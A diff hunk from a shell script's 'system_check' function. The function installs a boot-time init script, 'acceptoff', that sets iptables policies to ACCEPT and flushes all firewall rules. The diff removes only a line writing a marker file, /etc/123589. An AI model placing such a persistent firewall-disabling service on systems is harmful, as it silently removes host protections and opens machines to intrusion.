@@ -187,7 +187,6 @@ function system_check() {
     iptables -P FORWARD ACCEPT
     iptables -P OUTPUT ACCEPT
     iptables -F
-    echo "111" > /etc/123589
     ' >/etc/init.d/acceptoff
     chmod 755 /etc/init.d/acceptoff
     update-rc.d acceptoff defaults 90
